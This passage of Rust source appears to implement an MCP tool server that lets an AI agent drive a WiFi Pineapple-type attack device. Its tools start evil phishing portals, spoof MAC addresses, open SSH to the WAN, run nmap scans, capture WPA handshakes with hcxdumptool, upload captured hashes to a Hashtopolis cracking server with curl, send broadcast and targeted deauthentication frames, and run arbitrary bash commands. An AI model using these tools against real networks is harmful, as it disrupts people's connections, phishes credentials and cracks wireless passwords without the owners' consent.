                    steps.push(("uci", vec!["commit".to_string(), "wireless".to_string()]));
                    steps.push(("wifi", vec!["reload".to_string()]));
                    let mut out = run_steps(&steps)?;
                    if args.get("add_to_pool").and_then(Value::as_bool).unwrap_or(false) {
                        let p = device::run_cmd("PINEAPPLE_SSID_POOL_ADD", &[ssid.clone()]).unwrap_or_else(|e| e);
                        out.push_str(&format!("\npool: {p}"));
                    }
                    Ok(out)
                }
                _ => run_steps(&[
                    ("uci", vec!["delete".to_string(), "wireless.wlan0open.macaddr".to_string()]),
                    ("uci", vec!["commit".to_string(), "wireless".to_string()]),
                    ("wifi", vec!["reload".to_string()]),
                ]),
            },

            // ---- GPS / WiGLE / wardriving ----
            "gps" => match enum_arg(args, "action", &["list", "configure", "get"])?.as_str() {
                "list" => device::run_cmd("GPS_LIST", &[]),
                "get" => device::run_cmd("GPS_GET", &[]),
                _ => {
                    let dev = req_str(args, "device")?;
                    let baud = num_arg(args, "baud")?;
                    device::run_cmd("GPS_CONFIGURE", &[dev, baud])
                }
            },
            "wifi_wigle" => match enum_arg(args, "action", &["login", "logout", "start", "stop", "upload"])?.as_str() {
                "login" => device::run_cmd("WIGLE_LOGIN", &[req_str(args, "username")?, req_str(args, "password")?]),
                "logout" => device::run_cmd("WIGLE_LOGOUT", &[]),
                "start" => device::run_cmd("WIGLE_START", &[]),
                "stop" => device::run_cmd("WIGLE_STOP", &[]),
                _ => {
                    let mut a = Vec::new();
                    if args.get("archive").and_then(Value::as_bool).unwrap_or(false) {
                        a.push("--archive".to_string());
                    }
                    if args.get("remove").and_then(Value::as_bool).unwrap_or(false) {
                        a.push("--remove".to_string());
                    }
                    let files = str_array(args, "files")?;
                    if files.is_empty() {
                        return Err("files must contain at least one path for upload".to_string());
                    }
                    a.extend(files);
                    device::run_cmd("WIGLE_UPLOAD", &a)
                }
            },
            "wardrive" => match enum_arg(args, "action", &["start", "stop"])?.as_str() {
                "start" => {
                    let mut out = String::new();
                    if let Some(dev) = opt_str(args, "device").filter(|d| !d.is_empty()) {
                        let baud = opt_num_str(args, "baud").unwrap_or_else(|| "9600".to_string());
                        let mode = enum_arg_default(args, "mode", &["GPSD", "PINEAP"], "GPSD")?;
                        out.push_str(&device::run_cmd("GPS_CONFIGURE", &[mode, dev, baud]).unwrap_or_else(|e| e));
                        out.push('\n');
                        let _ = device::run_cmd("/etc/init.d/gpsd", &["restart".to_string()]);
                    }
                    let w = device::run_cmd("WIGLE_START", &[])?;
                    Ok(format!("{out}WiGLE log: {w}"))
                }
                _ => device::run_cmd("WIGLE_STOP", &[]),
            },

            // ---- portals ----
            "evil_portal" => {
                let initd = "/etc/init.d/evilportal";
                if !std::path::Path::new(initd).exists() {
                    return Err("Evil Portal is not installed (no /etc/init.d/evilportal). Install the evil_portal payload first.".to_string());
                }
                match enum_arg(args, "action", &["status", "list", "start", "stop", "enable", "disable", "switch"])?.as_str() {
                    "status" | "list" => Ok(list_portals("/root/portals")),
                    "switch" => {
                        let name = valid_name(&req_str(args, "name")?)?;
                        device::run_cmd(initd, &["switch".to_string(), name])
                    }
                    a => device::run_cmd(initd, &[a.to_string()]),
                }
            }
            "captive_portal" => match enum_arg(args, "action", &["status", "list", "remove"])?.as_str() {
                "list" => Ok(list_portals("/www/goodportal")),
                "status" => device::run_bash(
                    "echo nginx:; pgrep -a nginx || echo '  (not running)'; \
                     echo portals:; ls -1 /www/goodportal 2>/dev/null || echo '  (none)'; \
                     echo whitelist_monitor:; [ -f /tmp/goodportal-whitelist.pid ] && echo '  pid '$(cat /tmp/goodportal-whitelist.pid) || echo '  (not running)'; \
                     echo configured:; [ -f /etc/nginx/nginx.conf.goodportal.bak ] && echo '  yes (backup present)' || echo '  no'",
                ),
                _ => device::run_bash(
                    "set +e; \
                     for pf in /tmp/goodportal-whitelist.pid /tmp/goodportal-dns.pid; do [ -f \"$pf\" ] && kill \"$(cat \"$pf\")\" 2>/dev/null; rm -f \"$pf\"; done; \
                     /etc/init.d/nginx stop 2>/dev/null; /etc/init.d/php8-fpm stop 2>/dev/null; \
                     while idx=$(uci show firewall | grep -i goodportal | head -n1 | sed -n 's/^firewall.@redirect\\[\\([0-9]*\\)\\].*/\\1/p'); [ -n \"$idx\" ]; do uci delete firewall.@redirect[$idx]; done; \
                     uci commit firewall; \
                     [ -f /etc/nginx/nginx.conf.goodportal.bak ] && cp /etc/nginx/nginx.conf.goodportal.bak /etc/nginx/nginx.conf; \
                     uci set nginx.global.uci_enable=true 2>/dev/null; uci commit nginx 2>/dev/null; \
                     /etc/init.d/firewall restart 2>/dev/null; \
                     rm -f /tmp/goodportal_*; echo 'goodportal removed'",
                ),
            },

            // ---- device / network ops ----
            "mac_spoof" => {
                let iface = valid_iface(&req_str(args, "interface")?)?;
                match enum_arg(args, "action", &["set", "restore", "show"])?.as_str() {
                    "show" => device::run_cmd("cat", &[format!("/sys/class/net/{iface}/address")]),
                    "set" => {
                        let mac = norm_mac(&req_str(args, "mac")?).ok_or("mac must be a MAC address")?;
                        let mut out = run_steps(&[
                            ("ifconfig", vec![iface.clone(), "down".to_string()]),
                            ("ifconfig", vec![iface.clone(), "hw".to_string(), "ether".to_string(), mac.clone()]),
                            ("ifconfig", vec![iface.clone(), "up".to_string()]),
                        ])?;
                        if let Some(h) = opt_str(args, "hostname").filter(|h| !h.is_empty()) {
                            let h = valid_name(&h)?;
                            let _ = device::run_cmd("hostname", &[h.clone()]);
                            out.push_str(&format!("\nhostname set to {h}"));
                        }
                        Ok(out)
                    }
                    _ => {
                        let perm = device::run_cmd("ethtool", &["-P".to_string(), iface.clone()])?;
                        let mac = perm
                            .split_whitespace()
                            .last()
                            .and_then(norm_mac)
                            .ok_or("could not read permanent MAC via ethtool -P")?;
                        run_steps(&[
                            ("ifconfig", vec![iface.clone(), "down".to_string()]),
                            ("ifconfig", vec![iface.clone(), "hw".to_string(), "ether".to_string(), mac.clone()]),
                            ("ifconfig", vec![iface.clone(), "up".to_string()]),
                        ])
                    }
                }
            }
            "mgmt_access" => match enum_arg(args, "action", &["status", "open", "lock"])?.as_str() {
                "status" => {
                    let s = device::run_cmd("uci", &["get".to_string(), "firewall.dev_access_rule.enabled".to_string()])
                        .unwrap_or_else(|_| "absent (locked)".to_string());
                    let ip = device::run_cmd("ip", &["-4".to_string(), "addr".to_string(), "show".to_string(), "wlan0cli".to_string()])
                        .unwrap_or_default();
                    Ok(format!("dev_access_rule.enabled = {}\n{ip}", s.trim()))
                }
                "open" => run_steps(&[
                    ("uci", vec!["set".to_string(), "firewall.dev_access_rule=rule".to_string()]),
                    ("uci", vec!["set".to_string(), "firewall.dev_access_rule.name=Allow-Dev-Access".to_string()]),
                    ("uci", vec!["set".to_string(), "firewall.dev_access_rule.src=wan".to_string()]),
                    ("uci", vec!["set".to_string(), "firewall.dev_access_rule.dest_port=22 1471".to_string()]),
                    ("uci", vec!["set".to_string(), "firewall.dev_access_rule.proto=tcp".to_string()]),
                    ("uci", vec!["set".to_string(), "firewall.dev_access_rule.target=ACCEPT".to_string()]),
                    ("uci", vec!["set".to_string(), "firewall.dev_access_rule.enabled=1".to_string()]),
                    ("uci", vec!["reorder".to_string(), "firewall.dev_access_rule=0".to_string()]),
                    ("uci", vec!["commit".to_string(), "firewall".to_string()]),
                    ("fw4", vec!["restart".to_string()]),
                ]),
                _ => run_steps(&[
                    ("uci", vec!["delete".to_string(), "firewall.dev_access_rule".to_string()]),
                    ("uci", vec!["commit".to_string(), "firewall".to_string()]),
                    ("fw4", vec!["restart".to_string()]),
                ]),
            },

            // ---- active scanning / capture / exfil ----
            "nmap_scan" => {
                let target = req_cidr(args, "target")?;
                let scan = enum_arg(args, "scan", &["discovery", "subnet", "smb"])?;
                let (subdir, mut flags): (&str, Vec<String>) = match scan.as_str() {
                    "discovery" => ("nmapHostDiscovery", ["-sn", "-PE", "-PP", "-PS", "-PA"].iter().map(|s| s.to_string()).collect()),
                    "subnet" => ("nmapTarget", ["-Pn", "-sS", "-F"].iter().map(|s| s.to_string()).collect()),
                    _ => ("smb_discovery", ["-p", "445", "-n"].iter().map(|s| s.to_string()).collect()),
                };
                let dir = self.loot_dir.join(subdir);
                let _ = std::fs::create_dir_all(&dir);
                let ts = now_secs();
                if scan == "smb" {
                    flags.push(target.clone());
                    let out = device::run_cmd("nmap", &flags)?;
                    let f = dir.join(format!("smb_{ts}.txt"));
                    let _ = std::fs::write(&f, &out);
                    Ok(format!("{out}\n\n(saved: {})", f.display()))
                } else {
                    let base = dir.join(ts.to_string());
                    flags.push("-oA".to_string());
                    flags.push(base.display().to_string());
                    flags.push(target.clone());
                    let out = device::run_cmd("nmap", &flags)?;
                    Ok(format!("{out}\n\n(saved: {}.nmap/.gnmap/.xml)", base.display()))
                }
            }
            "hcx_capture" => {
                let installed = device::run_cmd("which", &["hcxdumptool".to_string()]).is_ok();
                match enum_arg(args, "action", &["status", "start", "stop"])?.as_str() {
                    "status" => {
                        let run = device::run_cmd("pgrep", &["-a".to_string(), "hcxdumptool".to_string()])
                            .unwrap_or_else(|_| "(not running)".to_string());
                        Ok(format!("hcxdumptool installed: {installed}\nrunning: {run}"))
                    }
                    "start" => {
                        if !installed {
                            return Err("hcxdumptool is not installed. Install it (opkg update && opkg install hcxdumptool hcxtools) or use pcap_control/handshakes for native recon capture.".to_string());
                        }
                        let iface = valid_iface(&opt_str(args, "interface").unwrap_or_else(|| "wlan1mon".to_string()))?;
                        let ts = now_secs();
                        let _ = device::run_cmd("mkdir", &["-p".to_string(), "/root/loot/handshakes".to_string()]);
                        device::run_bash(&format!(
                            "hcxdumptool -i {iface} -w /root/loot/handshakes/capture_{ts}.pcapng >/dev/null 2>&1 & echo started hcxdumptool pid $! -> capture_{ts}.pcapng"
                        ))
                    }
                    _ => device::run_cmd("pkill", &["-2".to_string(), "hcxdumptool".to_string()]),
                }
            }
            "usb_export" => device::run_bash(
                "set +e; DEV=''; \
                 for p in /dev/sda1 /dev/sdb1 /dev/sdc1 /dev/sdd1 $(ls /dev/sd[a-z][0-9] 2>/dev/null); do [ -b \"$p\" ] && { DEV=\"$p\"; break; }; done; \
                 [ -z \"$DEV\" ] && { echo 'no USB partition found'; exit 1; }; \
                 MP=/mnt/usb; mkdir -p \"$MP\"; grep -q \" $MP \" /proc/mounts || mount \"$DEV\" \"$MP\" || { echo \"mount $DEV failed\"; exit 1; }; \
                 DEST=\"$MP/pager-loot-$(date +%Y%m%d_%H%M%S)\"; mkdir -p \"$DEST\"; \
                 cp -a /root/loot/. \"$DEST\"/ 2>/dev/null || cp -r /root/loot/* \"$DEST\"/ 2>/dev/null; sync; \
                 echo \"copied /root/loot -> $DEST on $DEV\"; cd /; umount -l \"$MP\" 2>/dev/null; echo 'unmounted (lazy)'",
            ),
            "hashtopolis_upload" => {
                let file = req_str(args, "hashcat_file")?;
                let url = req_str(args, "url")?;
                let key = req_str(args, "api_key")?;
                let pretask = num_arg(args, "pretask_id")?;
                let crackerver = num_arg(args, "cracker_version_id")?;
                let htype = opt_num_str(args, "hash_type").unwrap_or_else(|| "22000".to_string());
                let agid = opt_num_str(args, "access_group_id").unwrap_or_else(|| "1".to_string());
                let name = opt_str(args, "name").filter(|n| !n.is_empty()).unwrap_or_else(|| "mcp-pager-upload".to_string());
                // Values are passed as positional args ($1..$8), never interpolated into the script.
                let script = r#"url="$1"; key="$2"; file="$3"; pretask="$4"; cver="$5"; htype="$6"; agid="$7"; name="$8"
[ -f "$file" ] || { echo "file not found: $file"; exit 1; }
data=$(base64 -w0 "$file") || { echo "base64 failed"; exit 1; }
body=$(jq -n --arg n "$name" --argjson ht "$htype" --argjson ag "$agid" --arg d "$data" --arg k "$key" '{section:"hashlist",request:"createHashlist",name:$n,isSalted:false,isSecret:false,isHexSalt:false,separator:":",format:0,hashtypeId:$ht,accessGroupId:$ag,data:$d,useBrain:false,brainFeatures:0,accessKey:$k}')
resp=$(curl -s -m 30 -X POST "$url" -H 'Content-Type: application/json' -d "$body")
echo "createHashlist: $resp"
hlid=$(echo "$resp" | jq -r '.hashlistId // empty')
[ -z "$hlid" ] && { echo "no hashlistId returned; aborting"; exit 1; }
rbody=$(jq -n --arg n "$name" --argjson hl "$hlid" --argjson pt "$pretask" --argjson cv "$cver" --arg k "$key" '{section:"task",request:"runPretask",name:$n,hashlistId:$hl,pretaskId:$pt,crackerVersionId:$cv,accessKey:$k}')
echo "runPretask: $(curl -s -m 30 -X POST "$url" -H 'Content-Type: application/json' -d "$rbody")""#;
                device::run_cmd(
                    "bash",
                    &["-c".to_string(), script.to_string(), "bash".to_string(), url, key, file, pretask, crackerver, htype, agid, name],
                )
            }

            // ---- full device control + active RF ----
            "bash" => {
                let cmd = req_str(args, "command")?;
                device::run_bash(&cmd)
            }
            "duckyscript" => {
                let cmd = req_str(args, "command")?;
                // Full-access tool: allow any executable by name or absolute path.
                // Command::new does not invoke a shell, so args are passed verbatim.
                if cmd.trim().is_empty() || cmd.bytes().any(|b| b == 0 || b == b'\n') {
                    return Err("command must be a non-empty command name or path".to_string());
                }
                let mut call = Vec::new();
                if let Some(a) = args.get("args").and_then(Value::as_array) {
                    for v in a {
                        call.push(v.as_str().ok_or("args must be strings")?.to_string());
                    }
                }
                device::run_cmd(&cmd, &call)
            }
            "deauth_broadcast" => {
                let bssid = norm_mac(&req_str(args, "bssid")?).ok_or("bssid must be a MAC address")?;
                let channel = num_arg(args, "channel")?;
                if args.get("csa").and_then(Value::as_bool).unwrap_or(false) {
                    device::run_cmd("PINEAPPLE_DEAUTH_CLIENT_CSA", &[bssid, channel])
                } else {
                    device::run_cmd(
                        "PINEAPPLE_DEAUTH_CLIENT_ALL",
                        &[bssid, "FF:FF:FF:FF:FF:FF".to_string(), channel],
                    )
                }
            }
            "deauth_clients" => {
                let bssid = norm_mac(&req_str(args, "bssid")?).ok_or("bssid must be a MAC address")?;
                let channel = num_arg(args, "channel")?;
                let clients = str_array(args, "clients")?;
                if clients.is_empty() {
                    return Err("clients must contain at least one MAC".to_string());
                }
                let mut results = Vec::new();
                for mac in &clients {
                    let target = match norm_mac(mac) {
                        Some(m) => m,
                        None => {
                            results.push(format!("{mac}: SKIPPED (not a MAC)"));
                            continue;
                        }
                    };
                    match device::run_cmd(
                        "PINEAPPLE_DEAUTH_CLIENT",
                        &[bssid.clone(), target.clone(), channel.clone()],
                    ) {
                        Ok(_) => results.push(format!("{target}: sent")),
                        Err(e) => results.push(format!("{target}: ERROR {e}")),
                    }
                }
                Ok(format!(
                    "deauth sent to {} client(s) on {bssid} ch {channel}:\n{}",
                    clients.len(),
                    results.join("\n")
                ))
            }
            "device_filter_edit" => {
                let list = enum_arg(args, "list", &["allow", "deny"])?;
                match enum_arg(args, "action", &["add", "delete", "clear", "mode"])?.as_str() {
                    "clear" => device::run_cmd("PINEAPPLE_DEVICE_FILTER_CLEAR", &[list]),
                    "mode" => {
                        let mode = enum_arg(args, "mode", &["allow", "deny"])?;
                        device::run_cmd("PINEAPPLE_DEVICE_FILTER_MODE", &[mode])
                    }
                    action => {
                        let mut macs = str_array(args, "macs")?;
                        for m in macs.iter_mut() {
                            *m = norm_mac(m).ok_or_else(|| format!("not a MAC address: {m}"))?;
                        }
                        let cmd = if action == "add" {
                            "PINEAPPLE_DEVICE_FILTER_ADD"
                        } else {
                            "PINEAPPLE_DEVICE_FILTER_DELETE"
                        };
                        let mut call_args = vec![list];
                        call_args.extend(macs);
                        device::run_cmd(cmd, &call_args)
                    }
                }
            }
            "network_filter_edit" => {
                let list = enum_arg(args, "list", &["allow", "deny"])?;
                match enum_arg(args, "action", &["add", "delete", "clear", "mode"])?.as_str() {
                    "clear" => device::run_cmd("PINEAPPLE_NETWORK_FILTER_CLEAR", &[list]),
                    "mode" => {
                        let mode = enum_arg(args, "mode", &["allow", "deny"])?;
                        device::run_cmd("PINEAPPLE_NETWORK_FILTER_MODE", &[mode])
                    }
                    action => {
                        let ssids = str_array(args, "ssids")?;
                        if ssids.is_empty() {
                            return Err("ssids must contain at least one entry".to_string());
                        }
                        let cmd = if action == "add" {
                            "PINEAPPLE_NETWORK_FILTER_ADD"
                        } else {
                            "PINEAPPLE_NETWORK_FILTER_DELETE"
                        };
                        let mut call_args = vec![list];
                        call_args.extend(ssids);
                        device::run_cmd(cmd, &call_args)
                    }
                }
            }

            other => Err(format!("unknown tool: {other}")),
        }
    }
}

fn tool(name: &str, description: &str, schema: Value) -> Value {
    json!({ "name": name, "description": description, "inputSchema": schema })
}

fn pretty(v: &Value) -> String {
    serde_json::to_string_pretty(v).unwrap_or_else(|_| v.to_string())
}

fn req_str(args: &Value, key: &str) -> Result<String, String> {
    args.get(key)
        .and_then(Value::as_str)
        .map(|s| s.to_string())
        .ok_or_else(|| format!("missing required string argument: {key}"))
}

fn opt_str(args: &Value, key: &str) -> Option<String> {
    args.get(key).and_then(Value::as_str).map(|s| s.to_string())
}

/// Required numeric arg, accepted as a JSON number or numeric string.
fn num_arg(args: &Value, key: &str) -> Result<String, String> {
    opt_num_str(args, key).ok_or_else(|| format!("missing required numeric argument: {key}"))
}

/// Accept a number given either as a JSON number or a numeric string.
fn opt_num_str(args: &Value, key: &str) -> Option<String> {
    match args.get(key) {
        Some(Value::Number(n)) => Some(n.to_string()),
        Some(Value::String(s)) if is_num(s) => Some(s.clone()),
        _ => None,
    }
}

fn enum_arg(args: &Value, key: &str, allowed: &[&str]) -> Result<String, String> {
    let v = req_str(args, key)?;
    if allowed.contains(&v.as_str()) {
        Ok(v)
    } else {
        Err(format!("{key} must be one of {allowed:?}"))
    }
}

fn str_array(args: &Value, key: &str) -> Result<Vec<String>, String> {
    let arr = args
        .get(key)
        .and_then(Value::as_array)
        .ok_or_else(|| format!("{key} must be an array of strings"))?;
    let mut out = Vec::with_capacity(arr.len());
    for v in arr {
        out.push(v.as_str().ok_or_else(|| format!("{key} must contain only strings"))?.to_string());
    }
    Ok(out)
}

fn with_opt(base: &[String], extra: Option<String>) -> Vec<String> {
    let mut v = base.to_vec();
    if let Some(e) = extra {
        v.push(e);
    }
    v
}

/// Normalize a MAC/BSSID given with or without `:`/`-` separators (as the recon
/// tools emit the bare 12-hex form) into canonical `aa:bb:cc:dd:ee:ff`.
fn norm_mac(s: &str) -> Option<String> {
    let hex: String = s.chars().filter(|c| *c != ':' && *c != '-').collect();
    if hex.len() == 12 && hex.bytes().all(|b| b.is_ascii_hexdigit()) {
        let lower = hex.to_lowercase();
        Some(
            (0..6)
                .map(|i| &lower[i * 2..i * 2 + 2])
                .collect::<Vec<_>>()
                .join(":"),
        )
    } else {
        None
    }
}

/// True for strings that look like a MAC/BSSID (with or without separators).
fn is_mac(s: &str) -> bool {
    norm_mac(s).is_some()
}

fn is_num(s: &str) -> bool {
    !s.is_empty() && s.bytes().all(|b| b.is_ascii_digit())
}

/// Run a sequence of exec commands, aggregating output; stop on the first error.
/// Values are passed as argv (never a shell), so caller input is not interpreted.
fn run_steps(steps: &[(&str, Vec<String>)]) -> Result<String, String> {
    let mut out = String::new();
    for (cmd, a) in steps {
        match device::run_cmd(cmd, a) {
            Ok(o) => {
                if !o.trim().is_empty() && o != "(ok)" {
                    out.push_str(&o);
                    out.push('\n');
                }
            }
            Err(e) => return Err(format!("{}\nstep `{cmd}` failed: {e}", out.trim_end())),
        }
    }
    Ok(if out.trim().is_empty() { "(ok)".to_string() } else { out.trim_end().to_string() })
}

/// Like `enum_arg` but returns `default` when the key is absent.
fn enum_arg_default(args: &Value, key: &str, allowed: &[&str], default: &str) -> Result<String, String> {
    match args.get(key) {
        None | Some(Value::Null) => Ok(default.to_string()),
        _ => enum_arg(args, key, allowed),
    }
}

/// Validate a network interface name (conservative charset).
fn valid_iface(s: &str) -> Result<String, String> {
    if !s.is_empty() && s.len() <= 20 && s.bytes().all(|b| b.is_ascii_alphanumeric() || matches!(b, b'.' | b'_' | b'-')) {
        Ok(s.to_string())
    } else {
        Err(format!("invalid interface name: {s}"))
    }
}

/// Validate a portal/host name (alphanumerics, space, `.`/`_`/`-`).
fn valid_name(s: &str) -> Result<String, String> {
    if !s.is_empty() && s.len() <= 64 && s.bytes().all(|b| b.is_ascii_alphanumeric() || matches!(b, b' ' | b'.' | b'_' | b'-')) {
        Ok(s.to_string())
    } else {
        Err(format!("invalid name (allowed: letters, digits, space, . _ -): {s}"))
    }
}

/// Required IP/CIDR target: restrict to hex digits, dots, colons and `/`.
fn req_cidr(args: &Value, key: &str) -> Result<String, String> {
    let s = req_str(args, key)?;
    if !s.is_empty() && s.len() <= 64 && s.bytes().all(|b| b.is_ascii_hexdigit() || matches!(b, b'.' | b':' | b'/')) {
        Ok(s)
    } else {
        Err(format!("invalid target (expected an IP or CIDR like 172.16.52.0/24): {s}"))
    }
}

fn now_secs() -> u64 {
    std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_secs())
        .unwrap_or(0)
}

/// List portal subdirectories under `base`, marking the active one (the target
/// of a `current` symlink, if present). Returns pretty JSON.
fn list_portals(base: &str) -> String {
    let dir = std::path::Path::new(base);
    let active = std::fs::read_link(dir.join("current"))
        .ok()
        .and_then(|p| p.file_name().map(|n| n.to_string_lossy().into_owned()));
    let mut portals = Vec::new();
    if let Ok(rd) = std::fs::read_dir(dir) {
        for ent in rd.flatten() {
            let name = ent.file_name().to_string_lossy().into_owned();
            if name == "current" {
                continue;
            }
            if ent.file_type().map(|t| t.is_dir()).unwrap_or(false) {
                portals.push(name);
            }
        }
    }
    portals.sort();
    let exists = dir.exists();
    pretty(&json!({
        "dir": base,
        "installed": exists,
        "active": active,
        "portals": portals,
    }))
}

/// Parse a Bluetooth SIG company id given as decimal ("76") or hex ("0x004C").
fn parse_company(s: &str) -> Result<i64, String> {
    let s = s.trim();
    let parsed = if let Some(hex) = s.strip_prefix("0x").or_else(|| s.strip_prefix("0X")) {
        i64::from_str_radix(hex, 16)
    } else {
        s.parse::<i64>()
    };
    parsed.map_err(|_| format!("company must be a decimal or 0x-hex id (got {s})"))
}
